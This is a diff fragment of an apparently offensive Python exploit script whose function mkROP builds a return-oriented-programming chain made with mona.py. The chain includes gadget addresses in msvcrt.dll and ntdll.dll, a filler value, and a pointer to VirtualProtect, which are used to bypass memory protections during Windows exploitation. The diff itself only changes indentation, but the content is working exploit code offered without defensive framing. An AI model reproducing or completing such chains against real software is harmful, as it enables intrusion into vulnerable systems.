@@ -41,12 +41,12 @@ def mkROP():
     # rop chain generated with mona.py - www.corelan.be
     # ?? 0188f56e -> deadbeef addr
     rop_gadgets = [
-    	  # This part is tricky, because it's necessary to fill stack
-    	  # Preventing missing bytes on addr: 
-    	  #     0x0188f56c: cccc0000 cccccccc cccccccc cccccccc 
-    	  0x77c3b860,  # POP EAX # RETN [msvcrt.dll] 
-    	  0x41414141,  # filler
-        #
+    	      # This part is tricky, because it's necessary to fill stack
+    	      # Preventing missing bytes on addr: 
+    	      #     0x0188f56c: cccc0000 cccccccc cccccccc cccccccc 
+    	      0x77c3b860,  # POP EAX # RETN [msvcrt.dll] 
+    	      0x41414141,  # filler
+              #
 	      0x77c3b860,  # POP EAX # RETN [msvcrt.dll] 
 	      0x77c11120,  # ptr to &VirtualProtect() [IAT msvcrt.dll]
 	      0x7c902afc,  # MOV EAX,DWORD PTR DS:[EAX] # RETN 0x04 [ntdll.dll] 
